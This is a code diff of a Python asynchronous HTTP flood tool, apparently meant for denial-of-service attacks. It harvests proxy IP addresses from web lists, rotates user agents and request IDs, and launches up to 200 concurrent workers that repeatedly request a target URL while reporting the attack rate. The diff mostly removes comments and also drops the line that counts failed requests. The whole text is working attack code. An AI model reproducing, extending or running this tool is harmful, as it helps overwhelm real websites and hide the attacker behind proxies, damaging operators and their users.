@@ -12,7 +12,7 @@ from colorama import Fore, init
 
 init(autoreset=True)
 
-# Short, valid list of user agents (fixed - no accidental concatenation)
+
 user_agents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15",
@@ -42,7 +42,7 @@ class CliAttacker:
         print(f"{message}{Fore.RESET}")
 
     async def fetch_ip_addresses(self, url):
-        # limit per-connection concurrency to avoid file-descriptor exhaustion
+        
         connector = aiohttp.TCPConnector(ssl=False, limit=10)
         timeout = aiohttp.ClientTimeout(total=10)
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
@@ -53,10 +53,7 @@ class CliAttacker:
                     ip_addresses = re.findall(r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}:\d+\b", text)
                     return ip_addresses
             except Exception as e:
-                # helpful debug message (you can remove or lower verbosity)
-                # print minimal info so output isn't too noisy
-                # Uncomment next line if you want full debug:
-                # self.log(Fore.YELLOW + f"Failed fetching proxies from {url}: {e}")
+               
                 return []
 
     async def get_all_ips(self):
@@ -91,7 +88,7 @@ class CliAttacker:
             "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16))
         }
         try:
-            # use a proper ClientTimeout object (was previously timeout=3 which caused failures)
+
             per_request_timeout = aiohttp.ClientTimeout(total=5)
             async with session.get(self.target_url, headers=headers, timeout=per_request_timeout) as response:
                 # treat 2xx as success
@@ -106,10 +103,7 @@ class CliAttacker:
                     rate = total_done / elapsed if elapsed > 0 else 0
                     self.log(Fore.RED + f"Requests: {self.success_count} | Failures: {self.fail_count} | Rate: {rate:.1f}/s | IP: {ip_address}")
         except Exception as e:
-            # increment fail count and (optionally) print debug
-            self.fail_count += 1
-            # minimal debug line, uncomment for more verbose debugging:
-            # self.log(Fore.YELLOW + f"Request exception: {type(e).__name__}: {e}")
+            self.log(Fore.YELLOW + f"Request exception: {type(e).__name__}: {e}")
 
     async def attack_worker(self, session, ip_cycle, worker_id):
         # each worker continues consuming until total requests reach target
@@ -132,10 +126,10 @@ class CliAttacker:
         connector = aiohttp.TCPConnector(limit=100, ssl=False)
         # session-level timeout left None; per-request timeouts used in send_request
         async with aiohttp.ClientSession(connector=connector) as session:
-            # create worker tasks (bounded)
+           
             worker_count = min(self.max_concurrent, self.num_requests, 200)
             workers = [asyncio.create_task(self.attack_worker(session, ip_cycle, i)) for i in range(worker_count)]
-            # wait until workers finish (they will stop when request count achieved)
+            
             await asyncio.gather(*workers, return_exceptions=True)
 
         elapsed = time.time() - self.start_time
